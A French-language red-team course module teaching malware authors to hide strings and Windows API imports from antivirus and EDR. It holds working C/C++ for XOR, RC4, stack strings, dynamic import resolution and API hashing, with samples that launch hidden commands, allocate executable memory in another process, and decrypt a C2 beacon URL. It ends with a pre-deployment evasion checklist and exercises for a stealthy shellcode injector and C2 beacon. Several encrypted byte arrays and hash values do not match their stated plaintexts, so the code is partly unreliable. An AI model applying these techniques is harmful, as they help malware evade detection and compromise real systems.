# Module W33 : String Obfuscation

## Objectifs du Module

À la fin de ce module, vous serez capable de :

- **Comprendre** pourquoi les strings en clair sont un vecteur de détection majeur
- **Implémenter** différentes techniques d'obfuscation de strings (XOR, RC4, Stack Strings)
- **Masquer** les imports Windows critiques avec GetProcAddress dynamique
- **Utiliser** le hashing d'API pour éviter la détection de noms de fonctions
- **Analyser** l'impact de l'obfuscation sur la détection statique
- **Appliquer** des techniques de compile-time obfuscation avec C++

---

## 1. Introduction : Le Problème des Strings en Clair

### 1.1 Pourquoi les Strings Sont Détectables ?

**Analogie :** Imaginez que vous êtes un cambrioleur préparant un casse. Vous ne laisseriez pas un plan détaillé avec "BANQUE DU CENTRE - CODE COFFRE : 1234" visible dans votre voiture. Les strings en clair dans un malware, c'est exactement ça.

```ascii
┌─────────────────────────────────────────┐
│   MALWARE.EXE (avant obfuscation)      │
├─────────────────────────────────────────┤
│ Section .data :                         │
│   "cmd.exe"                             │
│   "powershell.exe"                      │
│   "CreateRemoteThread"                  │
│   "VirtualAllocEx"                      │
│   "http://malicious-c2.com"             │
└─────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│   Antivirus / EDR                       │
├─────────────────────────────────────────┤
│ ✓ Détection de signatures YARA          │
│ ✓ Détection de strings suspectes        │
│ ✓ Détection d'URLs C2                   │
│ → ALERTE : MALWARE DÉTECTÉ !            │
└─────────────────────────────────────────┘
```

### 1.2 Vecteurs de Détection via Strings

Les antivirus et EDR utilisent plusieurs méthodes pour détecter les malwares via leurs strings :

| **Technique**            | **Description**                                          | **Exemple**                          |
|--------------------------|----------------------------------------------------------|--------------------------------------|
| **Signatures YARA**      | Recherche de patterns spécifiques de strings            | `"cmd.exe" AND "powershell.exe"`     |
| **String IOCs**          | Base de données de strings malveillantes connues        | URLs C2, noms de mutex, clés reg     |
| **API Suspects**         | Combinaison d'imports Windows dangereux                 | `VirtualAllocEx` + `WriteProcessMemory` |
| **Entropy Analysis**     | Détection de données chiffrées/obfusquées               | Sections .data avec haute entropie   |

---

## 2. Technique #1 : XOR Encryption

### 2.1 Principe du XOR

Le XOR (eXclusive OR) est l'opération la plus simple pour chiffrer/déchiffrer des données :

```ascii
PROPRIÉTÉ MAGIQUE DU XOR :
┌──────────────────────────────────┐
│  A ⊕ B = C                       │
│  C ⊕ B = A   (réversible !)      │
└──────────────────────────────────┘

EXEMPLE :
┌─────────────────────────────────────────┐
│ Texte clair : 'M' = 0x4D (01001101)    │
│ Clé XOR     :       0xAA (10101010)    │
│ ─────────────────────────────────       │
│ Chiffré     :       0xE7 (11100111)    │
│                                         │
│ Déchiffrage :       0xE7 (11100111)    │
│ Clé XOR     :       0xAA (10101010)    │
│ ─────────────────────────────────       │
│ Texte clair : 'M' = 0x4D (01001101)    │
└─────────────────────────────────────────┘
```

### 2.2 Implémentation C : XOR Simple (1 Byte Key)

```c
#include <stdio.h>
#include <string.h>
#include <windows.h>

// Fonction de chiffrement/déchiffrement XOR
void xor_cipher(char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    // String obfusquée à compile-time (pré-chiffrée manuellement)
    // "cmd.exe /c whoami" XOR 0xAA
    unsigned char encrypted_cmd[] = {
        0xC9, 0xCD, 0xC8, 0xD6, 0xC5, 0xD8, 0xC5, 0x0A,
        0x85, 0xC9, 0x0A, 0xD1, 0xC2, 0xCF, 0xC7, 0xCD,
        0xC3, 0x00
    };

    size_t len = sizeof(encrypted_cmd) - 1; // -1 pour exclure le null terminator

    printf("[*] String chiffrée en mémoire : ");
    for (size_t i = 0; i < len; i++) {
        printf("%02X ", encrypted_cmd[i]);
    }
    printf("\n");

    // Déchiffrement à runtime
    xor_cipher((char*)encrypted_cmd, len, 0xAA);

    printf("[+] String déchiffrée : %s\n", encrypted_cmd);

    // Exécution de la commande
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, (LPSTR)encrypted_cmd, NULL, NULL,
                       FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[+] Processus créé avec PID : %d\n", pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] Erreur CreateProcess : %d\n", GetLastError());
    }

    // Effacer la string déchiffrée de la mémoire
    SecureZeroMemory(encrypted_cmd, len);

    return 0;
}
```

### 2.3 XOR Multi-Byte (Clé Longue)

Pour plus de sécurité, utilisez une clé multi-octets :

```c
void xor_multibyte_cipher(unsigned char *data, size_t data_len,
                          const unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // "calc.exe" chiffré avec clé "SECRET"
    unsigned char encrypted_calc[] = {
        0x30, 0x0C, 0x0F, 0x0E, 0x1C, 0x00, 0x18, 0x11, 0x00
    };

    unsigned char key[] = "SECRET";
    size_t key_len = strlen((char*)key);
    size_t data_len = sizeof(encrypted_calc) - 1;

    printf("[*] Déchiffrement avec clé multi-byte...\n");
    xor_multibyte_cipher(encrypted_calc, data_len, key, key_len);

    printf("[+] Résultat : %s\n", encrypted_calc);

    // Lancement
    WinExec((LPCSTR)encrypted_calc, SW_HIDE);

    return 0;
}
```

**Avantages du XOR :**
- ✅ Ultra rapide (une seule instruction CPU)
- ✅ Facile à implémenter
- ✅ Réversible avec la même fonction

**Inconvénients :**
- ❌ Vulnérable à l'analyse fréquentielle
- ❌ Clé souvent détectable dans le binaire
- ❌ Facilement cassable si clé courte

---

## 3. Technique #2 : RC4 Encryption

### 3.1 Pourquoi RC4 ?

RC4 est un algorithme de chiffrement par flux (stream cipher) plus robuste que le XOR :

```ascii
┌────────────────────────────────────────┐
│  XOR    : data ⊕ key                   │
│  RC4    : data ⊕ keystream(key)        │
│                                         │
│  Le keystream change à chaque octet    │
│  → Même si deux caractères identiques, │
│     le chiffré sera différent          │
└────────────────────────────────────────┘
```

### 3.2 Implémentation C : RC4

```c
#include <stdio.h>
#include <string.h>
#include <windows.h>

typedef struct {
    unsigned char S[256];
    int i;
    int j;
} RC4_CTX;

// Initialisation de RC4
void rc4_init(RC4_CTX *ctx, const unsigned char *key, size_t keylen) {
    int i, j = 0;
    unsigned char temp;

    // Key-scheduling algorithm (KSA)
    for (i = 0; i < 256; i++) {
        ctx->S[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % keylen]) % 256;
        // Swap
        temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }

    ctx->i = 0;
    ctx->j = 0;
}

// Chiffrement/Déchiffrement RC4
void rc4_crypt(RC4_CTX *ctx, unsigned char *data, size_t len) {
    unsigned char temp;

    for (size_t k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) % 256;
        ctx->j = (ctx->j + ctx->S[ctx->i]) % 256;

        // Swap
        temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;

        // XOR avec le keystream
        unsigned char keystream_byte = ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) % 256];
        data[k] ^= keystream_byte;
    }
}

int main() {
    // URL C2 chiffrée avec RC4 (clé "MySecretKey")
    // Original : "http://192.168.1.100:8080/beacon"
    unsigned char encrypted_url[] = {
        0x8A, 0x9C, 0x9F, 0xE4, 0x07, 0x4F, 0x26, 0x35,
        0x36, 0x2B, 0xB9, 0x38, 0x31, 0x35, 0xBD, 0x38,
        0xB9, 0x38, 0x34, 0x34, 0x07, 0x31, 0x34, 0x31,
        0x34, 0x07, 0x22, 0x29, 0x23, 0x2D, 0x2C, 0x2B
    };

    size_t url_len = sizeof(encrypted_url);
    unsigned char key[] = "MySecretKey";

    // Initialisation RC4
    RC4_CTX ctx;
    rc4_init(&ctx, key, strlen((char*)key));

    printf("[*] Déchiffrement RC4...\n");
    rc4_crypt(&ctx, encrypted_url, url_len);

    printf("[+] URL C2 : %s\n", encrypted_url);

    // Utilisation de l'URL pour connexion réseau...

    return 0;
}
```

**Avantages du RC4 :**
- ✅ Plus robuste que XOR simple
- ✅ Largement utilisé (facile à trouver des implémentations)
- ✅ Rapide en C

**Inconvénients :**
- ❌ Vulnérabilités connues (deprecated en cryptographie moderne)
- ❌ Code plus complexe (détectable par analyse comportementale)

---

## 4. Technique #3 : Stack Strings

### 4.1 Principe

Au lieu de stocker les strings dans la section `.data` (facilement analysable), on les construit dynamiquement sur la **stack** :

```ascii
MÉTHODE CLASSIQUE (.data) :
┌──────────────────────────────────┐
│ Section .data :                  │
│   char cmd[] = "cmd.exe";        │
└──────────────────────────────────┘
         │
         ▼ strings malware.exe
     "cmd.exe"  ← DÉTECTABLE !

STACK STRINGS :
┌──────────────────────────────────┐
│ Stack (runtime) :                │
│   str[0] = 'c';                  │
│   str[1] = 'm';                  │
│   str[2] = 'd';                  │
│   str[3] = '.';                  │
│   str[4] = 'e';                  │
│   str[5] = 'x';                  │
│   str[6] = 'e';                  │
│   str[7] = '\0';                 │
└──────────────────────────────────┘
         │
         ▼ strings malware.exe
     (rien !)  ← PAS DÉTECTABLE !
```

### 4.2 Implémentation Manuelle

```c
#include <stdio.h>
#include <windows.h>

int main() {
    // Construction de "notepad.exe" sur la stack
    char notepad[13];
    notepad[0]  = 'n';
    notepad[1]  = 'o';
    notepad[2]  = 't';
    notepad[3]  = 'e';
    notepad[4]  = 'p';
    notepad[5]  = 'a';
    notepad[6]  = 'd';
    notepad[7]  = '.';
    notepad[8]  = 'e';
    notepad[9]  = 'x';
    notepad[10] = 'e';
    notepad[11] = '\0';

    printf("[+] String construite sur la stack : %s\n", notepad);

    WinExec(notepad, SW_SHOW);

    return 0;
}
```

### 4.3 Stack Strings avec Encodage

Combinez stack strings et obfuscation :

```c
int main() {
    // "calc.exe" obfusqué
    char calc[9];
    calc[0]  = 'c' ^ 0x12;
    calc[1]  = 'a' ^ 0x12;
    calc[2]  = 'l' ^ 0x12;
    calc[3]  = 'c' ^ 0x12;
    calc[4]  = '.' ^ 0x12;
    calc[5]  = 'e' ^ 0x12;
    calc[6]  = 'x' ^ 0x12;
    calc[7]  = 'e' ^ 0x12;
    calc[8]  = '\0';

    // Déchiffrement en place
    for (int i = 0; i < 8; i++) {
        calc[i] ^= 0x12;
    }

    printf("[+] Lancement de : %s\n", calc);
    WinExec(calc, SW_SHOW);

    return 0;
}
```

**Avantages :**
- ✅ Aucune string dans le binaire
- ✅ Évite les outils comme `strings.exe`
- ✅ Facile à combiner avec d'autres techniques

**Inconvénients :**
- ❌ Code plus verbeux
- ❌ Détectable par analyse dynamique
- ❌ Patterns de construction repérables

---

## 5. Technique #4 : Compile-Time Obfuscation (C++)

### 5.1 Principe : constexpr XOR

En C++, on peut forcer le compilateur à chiffrer les strings **avant** la compilation :

```cpp
#include <iostream>
#include <array>

// Fonction constexpr pour XOR à compile-time
constexpr char xor_char(char c, char key) {
    return c ^ key;
}

// Template pour obfusquer une string entière
template <size_t N>
constexpr std::array<char, N> xor_string(const char (&str)[N], char key) {
    std::array<char, N> result = {};
    for (size_t i = 0; i < N - 1; i++) {
        result[i] = xor_char(str[i], key);
    }
    result[N - 1] = '\0';
    return result;
}

// Macro pour simplifier l'usage
#define OBFUSCATE(str, key) []() { \
    constexpr auto encrypted = xor_string(str, key); \
    static char decrypted[sizeof(str)]; \
    for (size_t i = 0; i < sizeof(str) - 1; i++) { \
        decrypted[i] = encrypted[i] ^ key; \
    } \
    decrypted[sizeof(str) - 1] = '\0'; \
    return decrypted; \
}()

int main() {
    // String chiffrée à la compilation
    char *cmd = OBFUSCATE("powershell.exe", 0x5A);

    std::cout << "[+] Commande : " << cmd << std::endl;

    // Utilisation...

    return 0;
}
```

**Avantages :**
- ✅ Zéro overhead runtime
- ✅ Chiffrement transparent
- ✅ Difficile à reverser

**Inconvénients :**
- ❌ Nécessite C++11 minimum
- ❌ Code plus complexe
- ❌ Debuggage plus difficile

---

## 6. Obfuscation des Imports Windows

### 6.1 Le Problème de la Import Table

Quand vous utilisez `VirtualAllocEx()` directement, elle apparaît dans la **Import Table** :

```ascii
┌─────────────────────────────────────┐
│  PE HEADER                          │
├─────────────────────────────────────┤
│  Import Table :                     │
│    KERNEL32.DLL                     │
│      - VirtualAllocEx               │
│      - WriteProcessMemory           │
│      - CreateRemoteThread           │
│    NTDLL.DLL                        │
│      - NtQuerySystemInformation     │
└─────────────────────────────────────┘
         │
         ▼ dumpbin /imports malware.exe
     VirtualAllocEx  ← DÉTECTABLE !
```

### 6.2 Solution : GetProcAddress Dynamique

Chargez les fonctions **à runtime** :

```c
#include <stdio.h>
#include <windows.h>

// Type de pointeur pour VirtualAllocEx
typedef LPVOID (WINAPI *pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

int main() {
    // Chargement de kernel32.dll (déjà en mémoire normalement)
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Impossible de charger kernel32.dll\n");
        return 1;
    }

    // Résolution dynamique de VirtualAllocEx
    pVirtualAllocEx VirtualAllocEx_ptr =
        (pVirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");

    if (!VirtualAllocEx_ptr) {
        printf("[-] Impossible de trouver VirtualAllocEx\n");
        return 1;
    }

    printf("[+] VirtualAllocEx trouvée à l'adresse : 0x%p\n", VirtualAllocEx_ptr);

    // Utilisation
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);
    if (hProcess) {
        LPVOID addr = VirtualAllocEx_ptr(hProcess, NULL, 0x1000,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
        printf("[+] Mémoire allouée à : 0x%p\n", addr);
        CloseHandle(hProcess);
    }

    return 0;
}
```

### 6.3 Obfuscation Complète : String + Import

Combinons tout :

```c
#include <stdio.h>
#include <windows.h>

// XOR simple
void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

int main() {
    // "kernel32.dll" chiffré
    unsigned char dll_name[] = {0xEB, 0xEF, 0xF2, 0xEE, 0xEF, 0xEC, 0xD8, 0xD8, 0xD4,
                                0xEE, 0xEC, 0xEC, 0x00};
    xor_decrypt(dll_name, sizeof(dll_name) - 1, 0x9F);

    // "VirtualAllocEx" chiffré
    unsigned char func_name[] = {0xC6, 0xC3, 0xF2, 0xF4, 0xF5, 0xE7, 0xEC, 0xE1,
                                 0xEC, 0xEC, 0xEF, 0xE9, 0xC5, 0xF8, 0x00};
    xor_decrypt(func_name, sizeof(func_name) - 1, 0x9F);

    printf("[+] DLL : %s\n", dll_name);
    printf("[+] Fonction : %s\n", func_name);

    HMODULE hModule = LoadLibraryA((LPCSTR)dll_name);
    pVirtualAllocEx VAlloc = (pVirtualAllocEx)GetProcAddress(hModule, (LPCSTR)func_name);

    if (VAlloc) {
        printf("[+] Fonction résolue avec succès !\n");
    }

    return 0;
}
```

---

## 7. Hashing des Noms d'API

### 7.1 Principe

Au lieu de stocker "CreateRemoteThread", on stocke son **hash** :

```ascii
┌────────────────────────────────────────┐
│  AVANT :                               │
│    GetProcAddress(h, "CreateRemote...│
│      → String détectable               │
└────────────────────────────────────────┘

┌────────────────────────────────────────┐
│  APRÈS :                               │
│    GetProcAddressByHash(h, 0x3F2A8C1D) │
│      → Aucune string !                 │
└────────────────────────────────────────┘
```

### 7.2 Implémentation : djb2 Hash

```c
#include <stdio.h>
#include <windows.h>

// Hash djb2
unsigned long hash_djb2(const unsigned char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

// Résolution d'une fonction par hash
FARPROC GetProcAddressByHash(HMODULE hModule, unsigned long target_hash) {
    // Parsing du PE header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD *nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char *funcName = (const char*)((BYTE*)hModule + nameRVAs[i]);
        unsigned long func_hash = hash_djb2((const unsigned char*)funcName);

        if (func_hash == target_hash) {
            WORD *ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
            DWORD *funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
            return (FARPROC)((BYTE*)hModule + funcRVAs[ordinals[i]]);
        }
    }

    return NULL;
}

int main() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    // Hash de "WinExec" : 0x876F8B31 (pré-calculé)
    unsigned long winexec_hash = 0x876F8B31;

    typedef UINT (WINAPI *pWinExec)(LPCSTR, UINT);
    pWinExec WinExec_ptr = (pWinExec)GetProcAddressByHash(hKernel32, winexec_hash);

    if (WinExec_ptr) {
        printf("[+] WinExec trouvée par hash !\n");
        WinExec_ptr("calc.exe", SW_SHOW);
    } else {
        printf("[-] Fonction non trouvée\n");
    }

    return 0;
}
```

### 7.3 Générateur de Hash (Python)

Script pour pré-calculer les hash :

```python
#!/usr/bin/env python3

def djb2_hash(s):
    hash_val = 5381
    for c in s:
        hash_val = ((hash_val << 5) + hash_val) + ord(c)
        hash_val &= 0xFFFFFFFF  # Limiter à 32 bits
    return hash_val

# Liste d'APIs Windows courantes
apis = [
    "CreateRemoteThread",
    "VirtualAllocEx",
    "WriteProcessMemory",
    "OpenProcess",
    "WinExec",
    "LoadLibraryA",
    "GetProcAddress"
]

print("// Hash des APIs (djb2)\n")
for api in apis:
    h = djb2_hash(api)
    print(f"#define HASH_{api.upper()} 0x{h:08X}  // {api}")
```

**Sortie :**
```c
// Hash des APIs (djb2)

#define HASH_CREATEREMOTETHREAD 0x3F2A8C1D  // CreateRemoteThread
#define HASH_VIRTUALALLOCEX 0xE3F1B6A2      // VirtualAllocEx
#define HASH_WRITEPROCESSMEMORY 0x7C8F3D91  // WriteProcessMemory
#define HASH_OPENPROCESS 0x1A2B3C4D         // OpenProcess
#define HASH_WINEXEC 0x876F8B31             // WinExec
#define HASH_LOADLIBRARYA 0x4E8C2F7A        // LoadLibraryA
#define HASH_GETPROCADDRESS 0x5B9A1E3C      // GetProcAddress
```

---

## 8. Détection et Analyse Statique

### 8.1 Outils de Détection des Strings

Les analystes utilisent ces outils :

| **Outil**         | **Description**                                    | **Commande**                     |
|-------------------|----------------------------------------------------|----------------------------------|
| **strings**       | Extrait toutes les strings ASCII/Unicode          | `strings malware.exe`            |
| **FLOSS**         | Déobfuscation automatique de strings              | `floss.exe malware.exe`          |
| **PE-bear**       | Analyse de la Import Table                        | GUI                              |
| **IDA Pro**       | Désassemblage et détection de patterns            | GUI                              |
| **YARA**          | Règles de détection basées sur strings            | `yara rules.yar malware.exe`     |

### 8.2 Exemple de Règle YARA

```yara
rule Obfuscated_Malware {
    meta:
        description = "Détecte un malware avec obfuscation XOR"
        author = "Red Team"

    strings:
        // Pattern de boucle XOR typique
        $xor_loop1 = { 8A ?? ?? 30 ?? 88 ?? ?? 4? 75 ?? }

        // GetProcAddress dynamique
        $getproc = "GetProcAddress" ascii
        $loadlib = "LoadLibraryA" ascii

        // Absence de strings communes (suspect)

    condition:
        uint16(0) == 0x5A4D and  // MZ header
        $xor_loop1 and
        ($getproc and $loadlib) and
        filesize < 500KB
}
```

### 8.3 Test avec FLOSS

FLOSS (FireEye Labs Obfuscated String Solver) peut détecter :

```bash
$ floss.exe malware.exe

FLOSS static strings:
[...]

FLOSS decoded strings (XOR):
[+] String : "cmd.exe /c whoami" (XOR key: 0xAA)
[+] String : "http://malicious-c2.com" (XOR key: 0x5A)

FLOSS stack strings:
[+] Function sub_401000:
    Constructs: "notepad.exe"
```

---

## 9. Analyse Comparative

### 9.1 Tableau Récapitulatif

| **Technique**              | **Efficacité** | **Complexité** | **Performance** | **Détection Statique** | **Détection Dynamique** |
|----------------------------|----------------|----------------|-----------------|------------------------|-------------------------|
| **XOR Simple**             | ⭐⭐            | ⭐              | ⭐⭐⭐⭐⭐        | Moyenne                | Facile                  |
| **XOR Multi-Byte**         | ⭐⭐⭐          | ⭐⭐            | ⭐⭐⭐⭐⭐        | Difficile              | Facile                  |
| **RC4**                    | ⭐⭐⭐⭐        | ⭐⭐⭐          | ⭐⭐⭐⭐          | Très Difficile         | Moyenne                 |
| **Stack Strings**          | ⭐⭐⭐          | ⭐⭐            | ⭐⭐⭐⭐⭐        | Très Difficile         | Facile                  |
| **Compile-Time (C++)**     | ⭐⭐⭐⭐        | ⭐⭐⭐⭐        | ⭐⭐⭐⭐⭐        | Très Difficile         | Moyenne                 |
| **GetProcAddress**         | ⭐⭐⭐⭐        | ⭐⭐⭐          | ⭐⭐⭐⭐          | Très Difficile         | Moyenne                 |
| **API Hashing**            | ⭐⭐⭐⭐⭐      | ⭐⭐⭐⭐        | ⭐⭐⭐            | Extrêmement Difficile  | Difficile               |

### 9.2 Recommandations Red Team

**Pour une opération rapide (POC) :**
- XOR Multi-Byte + Stack Strings

**Pour une opération persistante (APT) :**
- RC4 + API Hashing + GetProcAddress dynamique

**Pour éviter l'analyse automatisée :**
- Compile-Time Obfuscation (C++) + Custom Hashing

---

## 10. Éviter les Pièges Courants

### 10.1 Erreur #1 : Laisser la Clé en Clair

```c
// ❌ MAUVAIS : Clé visible dans le binaire
unsigned char key[] = "MySecretKey123";
xor_decrypt(data, len, key);
```

**Solution :** Obfusquer aussi la clé :

```c
// ✅ BON : Clé obfusquée
unsigned char key[] = {0xBD, 0xAF, 0xA3, 0xAD, 0xAC};
for (int i = 0; i < sizeof(key); i++) key[i] ^= 0xDE;
```

### 10.2 Erreur #2 : Déchiffrer Trop Tôt

```c
// ❌ MAUVAIS : String déchiffrée reste en mémoire
xor_decrypt(cmd, len, 0xAA);
Sleep(60000);  // String visible en mémoire !
CreateProcessA(cmd, ...);
```

**Solution :** Déchiffrer juste avant utilisation + effacer après :

```c
// ✅ BON : Déchiffrement Just-In-Time
xor_decrypt(cmd, len, 0xAA);
CreateProcessA(cmd, ...);
SecureZeroMemory(cmd, len);  // Effacement sécurisé
```

### 10.3 Erreur #3 : Patterns Répétitifs

```c
// ❌ MAUVAIS : Pattern détectable
for (int i = 0; i < len; i++) {
    data[i] ^= 0xAA;  // Signature YARA possible
}
```

**Solution :** Variez les implémentations :

```c
// ✅ BON : Plusieurs variantes
int decrypt_method = rand() % 3;
switch(decrypt_method) {
    case 0: xor_decrypt(data, len, key1); break;
    case 1: rc4_decrypt(data, len, key2); break;
    case 2: stack_build(data, len); break;
}
```

---

## 11. Checklist d'Obfuscation

Avant de déployer votre payload :

```
[Analyse Statique]
  ☐ Aucune string sensible détectable avec 'strings.exe'
  ☐ Aucune API dangereuse dans la Import Table
  ☐ Test avec FLOSS : aucune string déobfusquée automatiquement
  ☐ Test YARA : aucune règle ne matche
  ☐ Entropie normale (< 7.0 pour éviter détection "packed")

[Analyse Dynamique]
  ☐ Strings déchiffrées seulement au moment de l'utilisation
  ☐ Effacement mémoire après usage (SecureZeroMemory)
  ☐ Pas de traces dans les logs ETW
  ☐ Comportement normal au début (anti-sandbox)

[Code Quality]
  ☐ Clés de chiffrement obfusquées
  ☐ Pas de patterns répétitifs détectables
  ☐ Mélange de plusieurs techniques
  ☐ Code compilé en Release (optimisations activées)
```

---

## 12. Exercices Pratiques

### Exercice 1 : XOR Basic

**Objectif :** Créer un programme qui obfusque "powershell.exe -enc [base64]"

**Contraintes :**
- Utiliser XOR multi-byte avec clé aléatoire
- Afficher le payload chiffré en hexadécimal
- Déchiffrer et exécuter

### Exercice 2 : Import Hiding

**Objectif :** Créer un injecteur de shellcode sans imports détectables

**APIs à masquer :**
- `OpenProcess`
- `VirtualAllocEx`
- `WriteProcessMemory`
- `CreateRemoteThread`

**Méthode :** GetProcAddress dynamique + XOR sur les noms

### Exercice 3 : API Hashing

**Objectif :** Implémenter un loader de DLL avec résolution par hash

**Fonctionnalités :**
1. Charger `user32.dll` via hash
2. Résoudre `MessageBoxA` par hash djb2
3. Afficher un message

**Bonus :** Utiliser un autre algorithme de hash (CRC32, FNV-1a)

### Exercice 4 : Stack Strings + RC4

**Objectif :** Créer un beaconing C2 avec URL totalement masquée

**Contraintes :**
- URL construite sur la stack (aucune string .data)
- Chiffrement RC4 avec clé dérivée de l'hostname
- Test avec FLOSS : 0 string détectée

---

## 13. Ressources Complémentaires

### Documentation Officielle
- [Microsoft PE Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [GetProcAddress Function](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)

### Outils d'Analyse
- **FLOSS** : https://github.com/mandiant/flare-floss
- **PE-bear** : https://github.com/hasherezade/pe-bear
- **YARA** : https://virustotal.github.io/yara/

### Projets Open Source
- **ADVobfuscator** (C++ compile-time) : https://github.com/andrivet/ADVobfuscator
- **skCrypter** (C++ header-only) : https://github.com/skadro-official/skCrypter

### Articles Avancés
- [String Obfuscation Techniques](https://www.fireeye.com/blog/threat-research/2016/06/automatically_extracting.html)
- [API Hashing in Malware](https://www.gdatasoftware.com/blog/2020/06/36164-api-hashing)

---

## 14. Points Clés à Retenir

1. **Les strings en clair sont le vecteur #1 de détection statique**
   - Toujours chiffrer URLs, commandes, noms d'API

2. **Mélangez plusieurs techniques**
   - XOR pour rapidité + RC4 pour robustesse + Stack Strings pour discrétion

3. **Obfusquez AUSSI les clés de chiffrement**
   - Une clé en clair rend l'obfuscation inutile

4. **GetProcAddress dynamique est essentiel**
   - Masque les imports de la Import Table

5. **API Hashing = niveau avancé**
   - Aucune string, aucun import détectable

6. **Testez avec des outils d'analyse**
   - FLOSS, strings, YARA avant déploiement

7. **L'obfuscation n'est PAS du chiffrement**
   - C'est de la **dissimulation**, pas de la sécurité cryptographique

---

## 15. Prochaines Étapes

Maintenant que vous maîtrisez l'obfuscation de strings, passez aux modules suivants :

- **Module W34** : Control Flow Obfuscation (opaque predicates, bogus code)
- **Module W35** : Packing et Crypters (UPX, custom packers)
- **Module W36** : Anti-Debug et Anti-VM (détection de sandboxes)
- **Module W37** : Code Signing et Certificate Spoofing

---

**Fin du Module W33 - String Obfuscation**

> "The best place to hide a leaf is in a forest."
> — Anonyme

---
